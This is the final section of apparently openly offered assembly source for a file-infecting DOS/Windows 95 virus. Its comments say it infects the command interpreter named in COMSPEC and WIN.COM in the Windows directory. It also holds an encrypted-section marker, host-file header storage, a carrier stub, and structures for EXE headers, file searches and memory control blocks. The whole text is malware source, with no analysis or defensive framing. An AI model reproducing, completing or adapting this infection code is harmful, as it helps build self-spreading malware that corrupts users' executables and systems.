   Found_ComSpec:  MOV     AX, 3D00h               ; Infect command-interpreter.
                   LEA     DX, [SI+8]
                   INT     21h

   Test_4_Win_Dir: CMP     AX, 'IW'                ; Look for 'WINDIR='.
                   JNE     Get_Next_Var

                   CMP     BX, '=R'
                   JNE     Get_Next_Var

                   PUSH    SI

                   ADD     SI, 7
                   MOV     DI, OFFSET Filename_Buffer

                   MOV     DX, DI

   Copy_Byte_W_D:  CLD
                   LODSB

                   OR      AL, AL
                   JZ      Win_Dir_Copied

                   STOSB

                   JMP     Copy_Byte_W_D

   Win_Dir_Copied: PUSH    DS

                   PUSH    ES
                   POP     DS

                   MOV     SI, OFFSET Win95_Init
                   MOV     CL, 9
                   REP     MOVSB

                   MOV     AH, 3Dh                 ; Infect WIN.COM.
                   INT     21h

                   POP     DS

                   POP     SI

   Get_Next_Var:   CLD

   Find_Next_Var:  LODSB

                   OR      AL, AL
                   JNZ     Find_Next_Var

                   JMP     Comp_Env_Var

   Exit_Inf_ComSpec:

                   POPA

                   RETN


                   DB      0EAh

   Check_4_EXE:
                   CMP     [SI.EXE_Mark], 'ZM'

                   RETN


   Win95_Init      DB      '\WIN.COM', 0


   IF (($ - Start) MOD 2) EQ 1
                   DB      0
   ENDIF


   End_Encrypted:

   Host_Bytes      DW      'ZM'
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      0
                   DW      OFFSET Carrier
                   DW      0

                   DW      0
                   DW      0
   Virus_End:

   Int24h          DW      0, 0
   File_Name       DW      0, 0

   Header          DB      40h DUP(0)

   Filename_Buffer DB      32 DUP(0)

   Buffer          DB      Virus_Size DUP(0)

   Virus_End_Mem:

   Carrier:
                   MOV     AX, 4C00h
                   INT     21h



   ; ------------- SOME STRUCTURES ---------------------------------------------


   COM_Header      STRUC
   Jump            DB      0
   Displacement    DW      0
   COM_Header      ENDS


   EXE_Header      STRUC
   EXE_Mark        DW      0       ; Marker valid .EXE-file: MZ or ZM.
   Image_Mod_512   DW      0
   Image_512_Pages DW      0
   Reloc_Items     DW      0
   Header_Size_Mem DW      0
   Min_Size_Mem    DW      0
   Max_Size_Mem    DW      0
   Program_SS      DW      0
   Program_SP      DW      0
   Checksum        DW      0
   Program_IP      DW      0
   Program_CS      DW      0
   Reloc_Table     DW      0
   EXE_Header      ENDS


   Encrypt_Header  STRUC
                   DB      24 DUP(0)
   Header_Key      DW      0
   Header_Slider   DW      0
   Encrypt_Header  ENDS


   Find_FN_Handle  STRUC
   Handle_Reserved DB      21 DUP(0)
   Handle_Attr     DB      0
   Handle_Time     DW      0
   Handle_Date     DW      0
   Handle_Size     DW      0, 0
   Handle_Name     DW      6 DUP(0)
                   DB      0
   Find_FN_Handle  ENDS


   Find_FN_FCB     STRUC
   FCB_Drive       DB      0
   FCB_Name        DB      8 DUP(0)
   FCB_Ext         DB      3 DUP(0)
   FCB_Attr        DB      0
   FCB_Reserved    DB      10 DUP(0)
   FCB_Time        DW      0
   FCB_Date        DW      0
   FCB_Start_Clust DW      0
   FCB_Size        DW      0, 0
   Find_FN_FCB     ENDS


   Push_All_Stack  STRUC
   Reg_ES          DW      0
   Reg_DS          DW      0
   Reg_DI          DW      0
   Reg_SI          DW      0
   Reg_BP          DW      0
   Reg_SP          DW      0
   Reg_BX          DW      0
   Reg_DX          DW      0
   Reg_CX          DW      0
   Reg_AX          DW      0
   Reg_Flags       DW      0
   Reg_Ret_Addr    DW      0
   Push_All_Stack  ENDS


   Find_FN_Win95   STRUC
   Win95_Attr      DD      0
   Win95_Created   DD      0, 0
   Win95_Access    DD      0, 0
   Win95_Time      DW      0
   Win95_Date      DW      0
                   DD      0
   Win95_Size_Hi   DD      0
   Win95_Size_Lo   DD      0
   Win95_Reserved  DB      8 DUP(0)
   Win95_Win_Name  DB      260 DUP(0)
   Win95_DOS_Name  DB      14 DUP(0)
   Find_FN_Win95   ENDS


   MCB_Header      STRUC
   MCB_Type        DB      0               ; M = not last block, Z = last block.
   MCB_PSP         DW      0               ; PSP-segment of this block.
   MCB_Size_Mem    DW      0               ; Size of block in paragraphs.
   MCB_Dunno       DB      3 DUP(0)        ; Don't care, don't need it.
   MCB_Program     DW      4 DUP(0)        ; Filename of program of this block.
   MCB_Header      ENDS


                   END     START
